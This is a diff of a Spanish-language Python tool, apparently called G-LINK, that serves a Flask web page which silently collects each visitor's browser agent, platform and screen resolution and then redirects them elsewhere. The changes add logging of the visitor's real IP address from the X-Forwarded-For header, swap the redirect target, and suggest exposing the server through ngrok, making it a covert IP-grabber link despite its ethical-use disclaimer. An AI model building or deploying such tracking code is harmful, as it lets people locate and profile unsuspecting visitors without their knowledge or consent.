@@ -4,7 +4,6 @@ import json
 import urllib.request
 import threading
 from flask import Flask, request, render_template_string
-from time import sleep
 
 # --- SERVIDOR G-LINK ---
 app = Flask(__name__)
@@ -19,17 +18,25 @@ HTML_TEMPLATE = """
             resolucion: window.screen.width + "x" + window.screen.height
         };
         fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
-        .then(() => window.location.href = "https://www.google.com");
+        .then(() => window.location.href = "https://coin.rtu.paraguay.com");
     </script>
 </body>
 </html>
 """
+
 @app.route('/')
 def index(): return render_template_string(HTML_TEMPLATE)
+
 @app.route('/log', methods=['POST'])
 def log():
+    # Obtener IP real del visitante
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     d = request.json
-    print(f"\n\033[1;32m[!] CAPTURA DE DISPOSITIVO:\033[0m\nAgente: {d.get('agente')}\nPlataforma: {d.get('plataforma')}\nResolución: {d.get('resolucion')}")
+    print(f"\n\033[1;32m[!] NUEVA CAPTURA DE DISPOSITIVO:\033[0m")
+    print(f"IP DEL DISPOSITIVO/ROUTER: {ip}")
+    print(f"AGENTE: {d.get('agente')}")
+    print(f"PLATAFORMA: {d.get('plataforma')}")
+    print(f"RESOLUCIÓN: {d.get('resolucion')}")
     return "OK"
 
 def iniciar_servidor():
@@ -74,14 +81,14 @@ def main():
         elif opc == "2":
             print("[*] Iniciando G-LINK en puerto 5000...")
             threading.Thread(target=iniciar_servidor, daemon=True).start()
-            input("[!] Servidor activo. Presiona ENTER para detener.")
+            input("[!] Servidor activo. (Si usas ngrok, corre: 'ngrok http 5000')\nPresiona ENTER para detener.")
 
         elif opc == "3":
             print("\n\033[1;36m[+] CREADOR: TRX-LILL\n[+] AÑO: 2026\n[+] ESPECIALIZADO EN HERRAMIENTAS OSINT.\033[0m")
             input("\nPresiona ENTER para volver...")
 
         elif opc == "4":
-            print("\n\033[1;35m[!] LICENCIA: SOFTWARE DE CÓDIGO ABIERTO.\n[!] ADVERTENCIA: EL USO DE ESTA HERRAMIENTA ES RESPONSABILIDAD EXCLUSIVA DEL USUARIO.\n[!] PROHIBIDO EL USO CON FINES ILÍCITOS O SIN CONSENTIMIENTO.\033[0m")
+            print("\n\033[1;35m[!] LICENCIA: SOFTWARE DE CÓDIGO ABIERTO.\n[!] ADVERTENCIA: EL USO DE ESTA HERRAMIENTA ES RESPONSABILIDAD DEL USUARIO.\n[!] USO EXCLUSIVO PARA FINES ÉTICOS Y DE SEGURIDAD.\033[0m")
             input("\nPresiona ENTER para volver...")
         
         elif opc == "5":
